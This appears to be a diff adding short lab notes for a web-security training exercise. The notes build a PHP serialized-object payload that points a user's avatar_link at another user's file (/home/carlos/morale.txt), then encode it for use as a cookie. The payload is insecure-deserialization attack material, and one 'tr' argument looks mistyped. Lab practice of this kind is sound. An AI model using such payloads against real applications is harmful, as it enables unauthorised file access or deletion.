@@ -1,0 +1,5 @@
+# Use Burp to extract post
+
+echo -n '/home/carlos/morale.txt' | wc -c
+
+urlencode $(echo -n 'O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"vtc9z0s2yv1tk0zmz57l2lanvmeob0el";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}'|base64|tr -d '\d')
